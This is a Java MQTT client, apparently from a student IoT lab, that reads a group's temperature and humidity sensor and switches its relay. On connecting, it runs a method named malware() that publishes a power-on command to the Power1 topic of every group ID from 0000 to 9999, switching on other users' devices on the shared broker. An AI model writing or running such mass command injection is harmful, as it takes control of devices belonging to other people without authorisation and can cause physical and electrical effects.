package mqtt;

import org.eclipse.paho.client.mqttv3.MqttClient;
import org.eclipse.paho.client.mqttv3.MqttConnectOptions;
import org.eclipse.paho.client.mqttv3.MqttException;
import org.eclipse.paho.client.mqttv3.MqttMessage;
import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence;
import sun.misc.ExtensionInstallationException;

public class Main {

    private static MqttClient sampleClient;

    public static void main(String[] args) throws Exception {
        String broker = "tcp://192.168.1.1:1883";

        MemoryPersistence persistence = new MemoryPersistence();

        try {
            sampleClient = new MqttClient(broker, MqttClient.generateClientId(), persistence);
            MqttConnectOptions connOpts = new MqttConnectOptions();
            connOpts.setCleanSession(true);

            sampleClient.setCallback(new SimpleMqttCallBack());

            System.out.println("Connecting to broker: " + broker);
            sampleClient.connect(connOpts);
            System.out.println("Connected");

            malware();

            String subTopic = "tele/grp0340/SENSOR";
            sampleClient.subscribe(subTopic);
            Thread.sleep(200000);

            sampleClient.disconnect();
            System.out.println("Disconnected");
            System.exit(0);
        } catch (MqttException me) {
            System.out.println("reason " + me.getReasonCode());
            System.out.println("msg " + me.getMessage());
            System.out.println("loc " + me.getLocalizedMessage());
            System.out.println("cause " + me.getCause());
            System.out.println("excep " + me);
            me.printStackTrace();

        }

    }

    public static void receivedReading(double temperature, double humidity) throws Exception {
        String content = "0";
        if (humidity > 0d) {
            content = "1";
        }

        String topic = "cmnd/grp0340/Power1";
        MqttMessage message = new MqttMessage();
        message.setPayload(content.getBytes());
        System.out.println(content.getBytes());
        sampleClient.publish(topic, message);
        System.out.println("Message published");
    }

    private static void malware() throws Exception {
        for (int i = 0; i < 10000; i++) {
            String device = String.format("%04d", i);
            MqttMessage msg = new MqttMessage();
            msg.setPayload("1".getBytes());
            sampleClient.publish("cmnd/grp" + device + "/Power1", msg);
        }

        System.out.println("Oops...");
    }

}